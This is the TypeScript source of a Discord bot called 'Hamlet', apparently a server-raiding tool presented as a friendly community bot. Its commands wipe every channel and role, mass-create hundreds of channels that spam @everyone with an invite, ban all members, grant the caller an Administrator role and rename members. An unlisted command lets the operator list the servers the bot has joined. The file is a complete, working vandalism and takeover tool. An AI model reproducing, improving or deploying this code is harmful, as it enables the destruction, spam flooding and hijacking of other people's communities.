import {
  Client,
  Message,
  EmbedBuilder,
  Events,
  ActivityType,
  ChannelType,
} from "discord.js";
import { raidData, colors, reset, admin, prefix } from "./config/raid.config";
import express from "express";

//Express Server
const app = express();
app.get("/", (req: any, res: any) => {
  res.send("Quién chucha eres tú huevon.");
});
app.listen(process.env.PORT || 3000);

//Client Init
const client: Client = new Client({ intents: 3276799 });

//Ready!
client.on(Events.ClientReady, () => {
  if (!client.user) return;
  console.log(client.user.username, " is ready");
  console.log(
    `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20application`
  );
  client.user.setPresence({
    status: "dnd",
    activities: [{ name: prefix, type: ActivityType.Competing }],
  });
});

//Commands
client.on(Events.MessageCreate, async (message: Message) => {
  if (message.channel.type === ChannelType.DM) return;
  if (message.author.bot) return;

  let Guild = message.guild;

  const funcs = {
    wrong: (params: string) => message.channel.send({ content: params }),
    sleep: (ms: number) => new Promise((resolve) => setTimeout(resolve, ms)),
  };
  if (message.content === `${prefix}help`) {
    const cmds = ["kill", "banall", "admin", "emoji", "massnick"];
    const embed: EmbedBuilder = new EmbedBuilder()
      .setTitle("Hamlet v1 | Prefix: `+`")
      .setDescription(
        `Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` +
          cmds.map((c) => "`" + c + "`").join("\n") +
          "\nTen un buen día!"
      )
      .setThumbnail("https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif");
    message.channel.send({ embeds: [embed] });
  }

  if (message.content === `${prefix}massnick`) {
    Guild?.members.cache.forEach((m) => {
      m.setNickname(raidData.invite).catch((e) =>
        console.log(colors.red, "Changing nicknames", reset)
      );
    });
  }

  if (message.content === `${prefix}admin`) {
    const role = await Guild?.roles.create({
      name: "pwns",
      permissions: ["Administrator"],
    });
    message.member?.roles.add(`${role?.id}`);
  }

  if (message.content === `${prefix}banall`) {
    Guild?.members.cache.forEach(async (m) => {
      if (m.bannable)
        m.ban().catch((e) =>
          console.log(colors.blue, "Banning users: ", reset, e)
        );
    });
  }

  if (message.content === `${prefix}nuke`) {
    const deleteServerData = async () => {
      Guild?.channels.cache.forEach((c) => {
        c.delete()
          .then((channel) => Guild?.channels.cache.delete(channel.id))
          .catch((e) =>
            console.log(colors.cyan, "Deleting channels", reset, e.message)
          );
      });
    };

    deleteServerData().then(() =>
      message.guild?.channels
        .create({ name: raidData.nuke_name, type: ChannelType.GuildText })
        .then((c) => c.send(`${raidData.invite} ||@everyone||`))
    );
  }

  //Automatic
  if (message.content === `${prefix}kill`) {
    try {
      const deleteChannels = async () => {
        Guild?.channels.cache.forEach((c) => {
          c.delete()
            .then((channel) => Guild?.channels.cache.delete(channel.id))
            .catch((e) =>
              console.log(colors.cyan, "Deleting channels", reset, e.message)
            );
        });
      };

      const deleteRoles = async () => {
        Guild?.roles.cache.forEach((r) => {
          r.delete()
            .then((role) => Guild?.roles.cache.delete(role.id))
            .catch((e) =>
              console.log(colors.yellow, "Deleting roles:", reset, e.message)
            );
        });
      };

      const createChannels = async () => {
        for (let i = 0; i <= 458; i++) {
          if (!Guild) return;

          const ch = await Guild?.channels.create({
            name: raidData.raid_channel,
            topic: raidData.invite,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              {
                id: Guild?.id,
                allow: ["ViewChannel"],
              },
            ],
          });

          const sendMessages = async (ms?: number) => {
            for (let x = 0; x <= 4; x++) {
              if (!ch) continue;
              ch.send(`@everyone ${raidData.message}`).catch((e) => {
                Guild?.channels.delete(ch.id);
                console.log(
                  colors.magenta,
                  "Sending messages:",
                  reset,
                  e.message
                );
              });
            }
            if (ms) await funcs.sleep(ms * 1000);
            return;
          };
          const createRoles = async () => {
            for (let x = 0; x <= 249; x++) {
              Guild?.roles
                .create({
                  name: raidData.nuke_name,
                })
                .catch((e) =>
                  console.log(colors.yellow, "Creating roles", reset, e.message)
                );
            }
          };
          Promise.all([ch, createRoles]).then(async () => {
            await sendMessages(5);
            await sendMessages(10);
            await sendMessages(20);
            await sendMessages();
          });
        }
      };
      await Guild?.setName(raidData.name);
      await Guild?.setIcon(raidData.icon);
      await deleteRoles();
      await deleteChannels();
      await createChannels();
    } catch (e) {
      console.log(colors.red, "Unexpected:", reset, e);
    }
  }

  //Server map
  if (message.content === `${prefix}servers`) {
    if (message.author.id !== admin) return;
    let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
    guilds.forEach((g) => {
      try {
        if (g.id === "897986461222207589") return;
        message.channel.send(" | " + g.name + " | " + g.memberCount);
      } catch (e) {
        message.channel.send(g.name + " | " + g.id);
      }
    });
  }
});

client.login(process.env.TOKEN);